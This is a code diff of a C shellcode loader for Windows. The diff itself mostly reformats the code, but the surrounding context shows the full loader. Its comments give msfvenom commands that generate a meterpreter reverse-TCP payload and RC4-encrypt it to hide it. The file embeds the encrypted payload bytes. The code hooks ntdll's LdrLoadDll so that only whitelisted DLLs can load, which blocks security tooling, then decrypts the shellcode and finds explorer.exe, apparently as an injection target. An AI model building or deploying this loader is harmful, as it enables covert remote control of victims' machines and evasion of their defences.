@@ -7,7 +7,7 @@
 
 #include "main.h"
 
-/****************************************************************************************************/
+///////////////////////////////////////////////////////////////////////////////
 // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
 // cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
 // xxd -i encmeter.bin
@@ -56,8 +56,9 @@ unsigned char encmeter_bin[] = {
   0x91, 0x2e, 0x62, 0x25, 0x6b, 0x3e, 0xd5, 0xf2, 0xf0, 0x9a, 0xda, 0xc3,
   0x60, 0x90, 0xca, 0x00, 0x04, 0x19
 };
+
 unsigned int encmeter_bin_len = 510;
-/****************************************************************************************************/
+///////////////////////////////////////////////////////////////////////////////
 
 NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
 {
@@ -68,12 +69,12 @@ NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacterist
     CHAR cDllName[MAX_PATH];
 
     // change to a char
-    sprintf(cDllName, "%S", DllName->Buffer);
+    wsprintf(cDllName, "%S", DllName->Buffer);
 
     for (i = 0; i < dwAllowDllCount; i++)
     {
         // is it on the whitelist
-        if (strcmp(cDllName, cAllowDlls[i]) == 0)
+        if (lstrcmp(cDllName, cAllowDlls[i]) == 0)
         {
             bAllow = TRUE;
 
@@ -81,17 +82,16 @@ NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacterist
 
             // repatch LdrLoadDll and call it
             VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
-            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
+            CopyMemory(lpAddr, OriginalBytes, sizeof(OriginalBytes));
             VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);
 
-            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary("ntdll.dll"), "LdrLoadDll");
+            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_) GetProcAddress(LoadLibrary("ntdll.dll"), "LdrLoadDll");
 
             LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);
 
             // then hook it again
             HookLoadDll(lpAddr);
         }
-
     }
 
     if (!bAllow)
@@ -108,17 +108,15 @@ VOID HookLoadDll(LPVOID lpAddr)
     void *hLdrLoadDll = &_LdrLoadDll;
 
     // our trampoline
-    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };
+    unsigned char boing[] = {0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3};
 
     // add in the address of our hook
     *(void **)(boing + 2) = &_LdrLoadDll;
 
     // write the hook
     VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(lpAddr, boing, sizeof(boing));
+    CopyMemory(lpAddr, boing, sizeof(boing));
     VirtualProtect(lpAddr, 13, oldProtect, &oldProtect);
-
-    return;
 }
 
 BOOL DecryptShellcode()
@@ -137,7 +135,7 @@ BOOL DecryptShellcode()
     if (!bSuccess)
     {
         printf("CryptAcquireContextW\n");
-        goto CLEANUP;
+        goto cleanup;
     }
 
     // init an create the hashing handle
@@ -145,7 +143,7 @@ BOOL DecryptShellcode()
     if (!bSuccess)
     {
         printf("CryptCreateHash\n");
-        goto CLEANUP;
+        goto cleanup;
     }
 
     // add the key to the hash object
@@ -153,7 +151,7 @@ BOOL DecryptShellcode()
     if (!bSuccess)
     {
         printf("CryptHashData\n");
-        goto CLEANUP;
+        goto cleanup;
     }
 
     // gen the session keys from the hash
@@ -161,7 +159,7 @@ BOOL DecryptShellcode()
     if (!bSuccess)
     {
         printf("CryptDeriveKey\n");
-        goto CLEANUP;
+        goto cleanup;
     }
 
     // decrypt the buffer
@@ -169,17 +167,14 @@ BOOL DecryptShellcode()
     if (!bSuccess)
     {
         printf("CryptDecrypt: %d\n", GetLastError());
-        goto CLEANUP;
+        goto cleanup;
     }
 
-    goto CLEANUP;
-
-    CLEANUP:
-        fnCryptReleaseContext(hCryptoProv, 0);
-        fnCryptDestroyKey(hCryptoKey);
-        fnCryptDestroyHash(hCryptHash);
-
-        return bSuccess;
+cleanup:
+    fnCryptReleaseContext(hCryptoProv, 0);
+    fnCryptDestroyKey(hCryptoKey);
+    fnCryptDestroyHash(hCryptHash);
+    return bSuccess;
 }
 
 DWORD FindExplorer()
@@ -189,15 +184,15 @@ DWORD FindExplorer()
 
     // take snapshot
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if(hSnapshot)
+    if (hSnapshot)
     {
         // enum the processes found
-        if(Process32First(hSnapshot, &pe32))
+        if (Process32First(hSnapshot, &pe32))
         {
             do
             {
                 // check if its explorer, if it is then give the pid
-                if (strcmp(pe32.szExeFile, "explorer.exe") == 0)
+                if (lstrcmp(pe32.szExeFile, "explorer.exe") == 0)
                 {
                     return pe32.th32ProcessID;
                 }
@@ -214,19 +209,19 @@ int main(int argc,  char const *argv[])
     DWORD dwPid;
     INITIAL_TEB InitTeb;
     LPVOID lpBuffer = NULL;
-    CLIENT_ID uPid = { 0 };
+    CLIENT_ID uPid = {0};
     HANDLE hThread, hProcess;
     OBJECT_ATTRIBUTES ObjectAttributes;
 
     // crypto stuff
-    fnCryptAcquireContextW = (CryptAcquireContextW_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptAcquireContextW");
-    fnCryptCreateHash = (CryptCreateHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptCreateHash");
-    fnCryptHashData = (CryptHashData_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptHashData");
-    fnCryptDeriveKey = (CryptDeriveKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDeriveKey");
-    fnCryptDecrypt = (CryptDecrypt_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDecrypt");
-    fnCryptReleaseContext = (CryptReleaseContext_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptReleaseContext");
-    fnCryptDestroyKey = (CryptDestroyKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyKey");
-    fnCryptDestroyHash = (CryptDestroyHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyHash");
+    fnCryptAcquireContextW = (CryptAcquireContextW_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptAcquireContextW");
+    fnCryptCreateHash = (CryptCreateHash_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptCreateHash");
+    fnCryptHashData = (CryptHashData_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptHashData");
+    fnCryptDeriveKey = (CryptDeriveKey_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDeriveKey");
+    fnCryptDecrypt = (CryptDecrypt_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDecrypt");
+    fnCryptReleaseContext = (CryptReleaseContext_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptReleaseContext");
+    fnCryptDestroyKey = (CryptDestroyKey_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyKey");
+    fnCryptDestroyHash = (CryptDestroyHash_) GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyHash");
 
     // decrypt the shellcode
     if (!DecryptShellcode())
@@ -236,10 +231,10 @@ int main(int argc,  char const *argv[])
     }
 
     // get addresss of where the hook should be
-    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");
+    lpAddr = (LPVOID) GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");
 
     // save the original bytes
-    memcpy(OriginalBytes, lpAddr, 13);
+    CopyMemory(OriginalBytes, lpAddr, 13);
 
     // set the hook
     HookLoadDll(lpAddr);
